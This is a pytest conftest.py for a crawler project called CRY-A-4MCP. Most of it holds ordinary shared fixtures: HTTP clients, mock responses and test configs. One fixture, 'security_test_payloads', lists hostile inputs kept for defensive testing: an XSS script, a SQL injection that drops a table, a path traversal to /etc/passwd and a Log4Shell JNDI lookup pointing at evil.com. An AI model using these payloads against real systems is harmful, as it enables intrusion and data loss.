"""Pytest configuration and shared fixtures for CRY-A-4MCP test suite.

This file provides global test configuration and shared fixtures that can be used
across all test modules in the project.
"""

import asyncio
import os
import sys
from pathlib import Path
from typing import AsyncGenerator, Generator

import pytest
import httpx
from fastapi.testclient import TestClient

# Add src directory to Python path for imports
project_root = Path(__file__).parent.parent
src_path = project_root / "src"
if src_path.exists():
    sys.path.insert(0, str(src_path))

# Test environment configuration
os.environ["TESTING"] = "true"
os.environ["ENVIRONMENT"] = "test"
os.environ["LOG_LEVEL"] = "DEBUG"


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def test_client() -> Generator[TestClient, None, None]:
    """Create a test client for FastAPI application."""
    try:
        # Try to import the main FastAPI app
        from src.main import app
        with TestClient(app) as client:
            yield client
    except ImportError:
        # If main app is not available, create a minimal test client
        from fastapi import FastAPI
        test_app = FastAPI()
        with TestClient(test_app) as client:
            yield client


@pytest.fixture
async def async_client() -> AsyncGenerator[httpx.AsyncClient, None]:
    """Create an async HTTP client for testing."""
    async with httpx.AsyncClient() as client:
        yield client


@pytest.fixture
def test_data_dir() -> Path:
    """Return path to test data directory."""
    return Path(__file__).parent / "fixtures"


@pytest.fixture
def sample_data() -> dict:
    """Provide sample test data."""
    return {
        "test_url": "https://example.com",
        "test_strategy": "default",
        "test_config": {
            "timeout": 30,
            "retries": 3,
            "user_agent": "test-agent"
        }
    }


@pytest.fixture
def mock_response_data() -> dict:
    """Provide mock API response data."""
    return {
        "status": "success",
        "data": {
            "id": "test-123",
            "content": "Test content",
            "metadata": {
                "timestamp": "2024-01-01T00:00:00Z",
                "source": "test"
            }
        }
    }


@pytest.fixture
def test_database_url() -> str:
    """Provide test database URL."""
    return "sqlite:///test.db"


@pytest.fixture
def test_redis_url() -> str:
    """Provide test Redis URL."""
    return "redis://localhost:6379/1"


@pytest.fixture(autouse=True)
def cleanup_test_files():
    """Automatically cleanup test files after each test."""
    yield
    # Cleanup logic can be added here
    test_files = [
        "test.db",
        "test.log",
        "test_output.json"
    ]
    for file in test_files:
        if os.path.exists(file):
            os.remove(file)


@pytest.fixture
def mock_external_api(monkeypatch):
    """Mock external API calls."""
    def mock_get(*args, **kwargs):
        class MockResponse:
            def __init__(self):
                self.status_code = 200
                self.json_data = {"status": "success", "data": "mocked"}
            
            def json(self):
                return self.json_data
            
            def raise_for_status(self):
                pass
        
        return MockResponse()
    
    monkeypatch.setattr("httpx.get", mock_get)
    monkeypatch.setattr("requests.get", mock_get)
    yield


@pytest.fixture
def test_user() -> dict:
    """Provide test user data."""
    return {
        "id": "test-user-123",
        "username": "testuser",
        "email": "test@example.com",
        "is_active": True
    }


@pytest.fixture
def test_strategy_config() -> dict:
    """Provide test strategy configuration."""
    return {
        "name": "test_strategy",
        "type": "extraction",
        "config": {
            "selectors": {
                "title": "h1",
                "content": ".content"
            },
            "options": {
                "wait_for": "networkidle",
                "timeout": 30000
            }
        }
    }


@pytest.fixture
def test_crawler_config() -> dict:
    """Provide test crawler configuration."""
    return {
        "name": "test_crawler",
        "base_url": "https://example.com",
        "strategy": "default",
        "settings": {
            "concurrent_requests": 1,
            "delay": 1,
            "respect_robots_txt": False
        }
    }


# Performance testing fixtures
@pytest.fixture
def benchmark_config() -> dict:
    """Configuration for performance benchmarks."""
    return {
        "iterations": 100,
        "warmup_rounds": 10,
        "timeout": 60
    }


# Security testing fixtures
@pytest.fixture
def security_test_payloads() -> list:
    """Common security test payloads."""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
    ]


# Pytest configuration hooks
def pytest_configure(config):
    """Configure pytest with custom markers and settings."""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')"
    )
    config.addinivalue_line(
        "markers", "integration: marks tests as integration tests"
    )
    config.addinivalue_line(
        "markers", "unit: marks tests as unit tests"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on test location."""
    for item in items:
        # Add markers based on test file location
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        elif "performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)
        elif "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)
        
        # Mark slow tests
        if "slow" in item.name or "benchmark" in item.name:
            item.add_marker(pytest.mark.slow)